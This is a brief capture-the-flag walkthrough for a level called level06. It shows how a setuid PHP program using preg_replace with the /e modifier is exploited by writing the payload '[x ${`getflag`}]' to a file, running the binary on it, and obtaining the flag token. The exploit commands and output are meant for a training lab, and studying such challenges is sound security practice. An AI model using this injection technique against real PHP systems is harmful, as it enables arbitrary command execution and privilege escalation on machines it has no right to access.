->ls -la

we find two interesting lines :

-rwsr-x---+ 1 flag06 level06 ... level06
-rwsr-x---  1 flag06 level06 ... level06.php

-> cat level06.php

So, after inspecting the code, we can see that it's actually posible 
to inject something in it, so we can exploit it.

This is possible because The /e transforms the replacement string into 
executed PHP code â€” so if we get to control the text captured between 
[x ...], we can close the string and inject code.

So let's try :

-> echo '[x ${`getflag`}]' > /tmp/getflag

-> ./level06 /tmp/getflag

PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1

-> su level07 ..
